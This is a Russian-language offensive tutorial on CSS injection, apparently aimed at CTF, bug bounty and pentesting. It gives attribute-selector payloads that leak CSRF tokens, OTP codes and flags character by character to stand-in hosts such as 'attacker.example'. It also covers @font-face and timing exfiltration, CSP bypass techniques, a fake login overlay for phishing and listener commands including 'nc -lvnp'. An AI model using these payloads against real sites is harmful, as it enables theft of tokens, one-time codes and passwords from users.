**CSS injection** — это возможность внедрить в страницу произвольный CSS (через инъекцию в `style`, атрибут `style`, или `<style>`-тег). Само по себе это выглядит безобидно, но CSS умеет: **читать значения атрибутов** (`[value^="a"]`), **подгружать внешние ресурсы** (`background:url(...)`) и **менять вид/поведение** страницы. Комбинируя это, можно посимвольно вытянуть секрет (CSRF-токен, одноразовый код), который находится в атрибуте HTML.

## Теория: CSS-селекторы как оракул

CSS позволяет выбирать элементы по значению атрибута:

```css
input[name="csrf"][value^="a"] { background: url(https://attacker/leak?c=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker/leak?c=b); }
```

`^=` — «начинается с», `$=` — «заканчивается», `*=` — «содержит». Если селектор совпал, браузер грузит `url(...)` → запрос на ваш сервер с утёкшим символом. Значит, перебирая префиксы, можно восстановить значение посимвольно (по одному символу за раз, если использовать `^=`).

Ограничения: `url()` грузится только если элемент видим/подходит; для длинных секретов нужен посимвольный перебор (десятки-сотни запросов). Работает и без JS.

## Теория: каналы утечки в CSS

| Приём | Как утекает |
|-------|-------------|
| `background:url(...)` | запрос к вашему серверу при совпадении селектора |
| `@import url(...)` | загрузка внешнего CSS |
| `font-family` + кастомный шрифт | утечка через «лигатуры» (сложно, но известно) |
| `content` в `::before` | визуальная подмена текста |
| `list-style-image:url(...)` | ещё один канал запроса |
| `@font-face` + `unicode-range` | посимвольная утечка по запросам шрифта |

Для эксфильтрации секретов на практике чаще всего используют `background:url()` с селекторами по атрибуту.

## Теория: где CSS-инъекция встречается

- Пользовательский «тема»/«цвет»/«фон», который подставляется в `style` без валидации.
- Markdown-рендерер, разрешающий `<style>` или атрибут `style`.
- Инъекция прямо в `<style>`-блок (например, шаблон `<style>body{background:{{color}}}</style>`).
- Атрибут `style` на элементе, куда попадает ввод (`<div style="color:{{x}}">`).

Если вы можете закрыть значение и добавить свои правила (`"}` или `;`), вы контролируете CSS.

## Инструменты и команды

Проверить, что ввод попадает в CSS-контекст:

```bash
curl -s 'https://target.local/?theme=red%22%7Dbody%7Bbackground:blue%7D%2F%2A' | grep -o 'body{background:blue}'
```

Поднять приёмник:

```bash
python3 -m http.server 8000
```

Генерировать селекторы удобно скриптом (для своего теста; не бомбить чужой сервер):

```python
# пример: сгенерировать CSS для перебора префиксов hex-символов
for c in "0123456789abcdef":
    print(f'input[value^="{c}"]{{background:url(//ATTACKER/leak?c={c})}}')
```

Для реальной посимвольной атаки нужен сервер, который по пришедшему префиксу генерирует следующий набор правил (итеративно). В CTF часто достаточно одного символа/простого условия.

## Разобранный пример: утечка CSRF-токена посимвольно

Шаг 1. Находим токен в HTML:

```bash
curl -s https://target.local/form -b 'session=victim' | grep -o 'value="[^"]*"'
```

Допустим, токен `a1b2c3`.

Шаг 2. Ищем CSS-инъекцию **на той же странице** (например, в поле, которое подставляется в `style`). Вставляем первое правило:

```
"} input[name="csrf"][value^="a"]{background:url(//ATTACKER/leak?c=a)}
```

Шаг 3. В логах приёмника видим `c=a` → первый символ `a`. Итерируем: `value^="a1"`, `value^="a1b"`, … Пока не восстановим токен.

Шаг 4. В отчёте: точный CSS, число запросов, восстановленный токен. Далее токен можно использовать в CSRF-атаке (`web-csrf`).

## Разобранный пример: визуальный фишинг через CSS

Инъекция CSS позволяет нарисовать фальшивый логин-оверлей поверх настоящей страницы:

```css
"} body{visibility:hidden} .fake{visibility:visible;position:fixed;top:0;left:0;...}
```

Жертва вводит пароль в поддельную форму, отправляя его на ваш сервер. Это уже социальная инженерия, но корень — та же CSS-инъекция.

## Частые ошибки

- **Считать CSS-инъекцию «не багом».** Она даёт утечку секретов и UI-подмену.
- **Забывать про `url()`-ограничения.** Не каждый элемент грузит фон; нужен подходящий селектор/видимость.
- **Игнорировать длину секрета.** Посимвольный перебор для длинных токенов дорог; оптимизируйте (параллельно, по группам).
- **Не учитывать `Content-Security-Policy`.** `style-src`/`img-src` могут блокировать ваш хост — проверяйте.
- **Путать с XSS.** CSS не исполняет JS; это другой класс утечки.

## Полный арсенал селекторов и функций для утечки

CSS-инъекция превращает стили в оракул: браузер сам подсказывает, какие символы содержит атрибут. Ниже — полный набор примитивов, которые стоит держать под рукой.

| Примитив | Назначение |
|----------|-----------|
| `input[value^="a"]` | значение начинается с `a` |
| `input[value$="z"]` | значение заканчивается на `z` |
| `input[value*="tok"]` | значение содержит `tok` |
| `input[value="a"]` | точное совпадение |
| `input:has(...)` | вложенные проверки (новые браузеры) |
| `[name^="csrf"]` | имя атрибута начинается с |
| `:not(...)` | исключение (для построения оракула) |

Загрузка внешнего ресурса — сигнал «селектор совпал»:

```css
input[value^="a"] { background: url(https://attacker.example/leak?c=a); }
```

Браузер сделает запрос только если условие истинно. Так посимвольно восстанавливается значение.

## Техники эксфильтрации: URL, шрифты, анимации

Классический канал — `url()` в `background`/`list-style`/`border-image`. Но есть и другие, устойчивые к блокировкам:

```css
/* 1) через @font-face — каждая буква подгружает свой шрифт */
@font-face { font-family: leak; src: url(https://attacker.example/f?c=a); unicode-range: U+0061; }
@font-face { font-family: leak; src: url(https://attacker.example/f?c=b); unicode-range: U+0062; }

/* 2) через @import — грубая проверка */
@import url(https://attacker.example/i?sel=ok);

/* 3) через анимацию + background-image */
@keyframes exfil { from { background: url(https://attacker.example/x); } }
```

`@font-face` с `unicode-range` — самый мощный канал: он работает, даже когда `url()` в `background` вырезан CSP-политикой для изображений, но разрешён для шрифтов. Утечку также можно строить на **таймингах**: селектор `:hover` + задержка анимации, а по времени отклика судить о совпадении.

## Разобранный пример: посимвольный дамп CSRF-токена

Цель: страница содержит `<input name="csrf" value="8f3a...">`, и ввод пользователя попадает в `<style>`. Атакуем посимвольно.

```text
# шаг 1: проверяем алфавит (какой первый символ)
input[name="csrf"][value^="0"] { background:url(//attacker/x?0); }
input[name="csrf"][value^="1"] { background:url(//attacker/x?1); }
...
input[name="csrf"][value^="f"] { background:url(//attacker/x?f); }
```

Приходим на страницу-инъекцию; браузер жертвы (или наш, если это CTF) запрашивает ровно один URL — соответствующий первому символу. Фиксируем его из логов `attacker`:

```bash
# простейший listener
python3 -m http.server 80   # или nc -lvnp 80
# видим: GET /x?8 HTTP/1.1   -> первый символ '8'
```

Затем повторяем для второго символа, уже зная первый:

```text
input[name="csrf"][value^="8f"] { background:url(//attacker/x?8f); }
```

Так токен собирается слева направо. Для 32-символьного токена с алфавитом `0-9a-f` нужно не более 16×32 запросов.

## Разобранный пример: кража данных без JavaScript

CSS-инъекция часто обходит CSP, который запрещает инлайн-скрипты. Покажем чтение атрибута `data-secret` со страницы профиля.

```css
/* инъектируем в style-параметр (например, тема оформления) */
div[data-secret^="flag{"] { background-image: url("https://attacker.example/flag1"); }
```

Комбинация с `:has()` позволяет дотянуться до значений, которые не лежат в простых атрибутах:

```css
form:has(input[name="otp"][value^="1"]) { background: url(//attacker/otp1); }
```

Это особенно опасно на страницах с OTP/2FA: посимвольно восстанавливается одноразовый код прямо из DOM, если он попадает в атрибут.

## Где CSS-инъекция встречается на практике

- **Пользовательские темы.** Поле «свой CSS», «фон профиля», «цвет» без экранирования — прямой `<style>`-контекст.
- **Markdown/HTML-рендереры.** `<style>` в пользовательском посте, если санитайзер пропускает тег.
- **`style="..."` атрибут.** Здесь нельзя тег `<style>`, но можно `background:url(...)` в значении атрибута.
- **SVG.** `<svg><style>` внутри загружаемого изображения.
- **Email-клиенты.** Письмо с `<style>` и внешними `url()` — трекинг-пиксель по условию.
- **CSS custom properties.** `--x: url(...)`, подставленные в `background`.

Отдельно: **CSS-инъекция как усилитель XSS** — если санитайзер вырезает `<script>`, но оставляет `<style>`, можно вытащить секреты без JS и передать их дальше.

## Обходы защит и CSP

| Защита | Обход |
|--------|-------|
| `style-src 'self'` | `@import` с same-origin редиректом; шрифты с разрешённого домена |
| CSP без `img-src` | использовать `font-src`/`@font-face` |
| Экранирование `>`/`<` | инъекция внутри существующего `<style>` без тегов |
| Фильтр `url(` | `@import`, `image-set()`, `src()` |
| Ограничение длины | собирать правило по частям через несколько параметров |
| `Content-Security-Policy: style-src 'nonce-...'` | инъекция в уже подписанный `<style>`-блок |

Проверить, что канал не заблокирован, можно через DevTools → Network: если запрос к `attacker` уходит, эксфильтрация работает.

## Что делать дальше / решение

1. **Найдите контекст.** Есть ли `<style>` или `style="..."`, куда попадает ввод.
2. **Проверьте простым правилом.** `body{background:url(//attacker/test)}` — ушёл ли запрос.
3. **Постройте оракул.** Посимвольный `^=`, начните с первого символа.
4. **Автоматизируйте.** Скрипт генерирует пачку правил и парсит логи listener'а.
5. **Обойдите CSP.** Если `url()` режется — переходите на `@font-face`/`unicode-range`.
6. **Зафиксируйте PoC.** CSS-сниппет + восстановленное значение (токен, OTP, флаг).

## Тайминг-атаки и слепая эксфильтрация через CSS

Когда внешние запросы полностью запрещены (строгий CSP, offline-контекст), значение можно извлекать **по времени**. Идея: селектор совпал → запускается длинная анимация → страница «замирает» дольше.

```css
input[value^="a"] { animation: slow 3s; }
@keyframes slow { from { opacity: 0.99; } to { opacity: 1; } }
```

Измеряя время до какого-то события (например, до появления элемента по `:has()` или до завершения `transition`), можно по задержке судить о совпадении символа. Это медленнее сетевого канала, но работает при полном отсутствии исходящих запросов.

## Сводка каналов и их пригодности

| Канал | Нужен egress | Обходит `img-src 'none'` | Скорость |
|-------|-------------|--------------------------|----------|
| `background: url()` | да | нет | высокая |
| `@font-face` | да | да (через `font-src`) | высокая |
| `@import` | да | зависит | средняя |
| тайминг | нет | да | низкая |
| scrollbar/`:has()` + размеры | нет | да | низкая |

Практический порядок: сначала пробуем `url()`, затем `@font-face`, при жёстком CSP — тайминги. Всегда проверяйте, какой из директив CSP разрешён, через заголовок `Content-Security-Policy` в ответе.

## Где пригодится

- **CTF (Web):** задачи, где флаг/токен в атрибуте, а XSS заблокирован — CSS-утечка.
- **Bug bounty:** кража CSRF-токенов и OTP через CSS-инъекцию — редкий, но оплачиваемый баг.
- **Пентест:** тестирование пользовательских тем/настроек стилей.
- **Работа (AppSec/Dev):** понимание, почему нельзя подставлять ввод в CSS без санитайза.
